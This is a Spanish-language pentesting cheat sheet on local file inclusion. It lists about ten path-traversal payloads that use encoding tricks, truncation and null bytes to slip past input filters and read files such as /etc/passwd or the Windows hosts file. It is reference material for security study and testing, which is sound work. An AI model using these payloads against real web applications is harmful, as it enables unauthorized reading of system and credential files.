---
aliases: null
tags:
  - type/technique
  - vuln/lfi
  - technique/execution
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
kind: SubCheatSheet
linked:
  - '[[File Inclusion]]'
---
# LFI - Path Traversal y Bypass de Filtros

***

## Cheatsheet

|                **Técnica**                 |                                 **Descripción**                                  |                  **Payload**                   |
| :----------------------------------------: | :------------------------------------------------------------------------------: | :--------------------------------------------: |
|         <br>**Double dot bypass**          |         <br>Duplicar `../` para evadir reemplazo simple de `../`<br><br>         |          <br>`....//....//etc/passwd`          |
|         <br>**Barras invertidas**          |        <br>Usar `\` en lugar de `/` (funciona en algunos parsers)<br><br>        |          <br>`..\..\..\..\etc\passwd`          |
|        <br>**URL encoding simple**         |          <br>Encodear `../` para evadir filtros a nivel string<br><br>           |        <br>`..%2f..%2f..%2fetc/passwd`         |
|        <br>**Double URL encoding**         |        <br>Doble encode para evadir filtros que decodean una vez<br><br>         |     <br>`..%252f..%252f..%252fetc/passwd`      |
|           <br>**UTF-8 encoding**           |               <br>Representación Unicode de los caracteres<br><br>               |       <br>`%c0%ae%c0%ae%c0%afetc/passwd`       |
|           <br>**Mixed encoding**           |           <br>Combinar distintos encodings en un mismo payload<br><br>           |      <br>`%2e%2e/..%2f..%252fetc/passwd`       |
|          <br>**Path truncation**           | <br>Alargar el path con `.` o `/` hasta truncar por límite de caracteres<br><br> |    <br>`../../../../../[...]/../etc/passwd`    |
|    <br>**Bypass de extensión forzada**     |        <br>Agregar null bytes o paths extra para cortar extensión<br><br>        |         <br>`....//etc/passwd%00.php`          |
| <br>**Bypass de blacklist de directorios** |          <br>Usar paths equivalentes que no matcheen el filtro<br><br>           |        <br>`/var/www/../../etc/passwd`         |
|      <br>**Case variation (Windows)**      |     <br>Alternar mayúsculas/minúsculas en Windows (case insensitive)<br><br>     | <br>`..\..\WINDOWS\system32\drivers\etc\hosts` |
^lfi-traversal

***

## Overview

Cuando el desarrollador intenta proteger el LFI básico con filtros (reemplazo de strings, blacklists, validación de extensión), estas técnicas buscan evadir esas protecciones. La idea central es representar el mismo traversal de formas alternativas que el filtro no contempla. Es un juego de gato y ratón: por cada filtro hay múltiples formas de bypass, y la efectividad depende de cómo esté implementada la sanitización.


***

## Notas Relacionadas


***
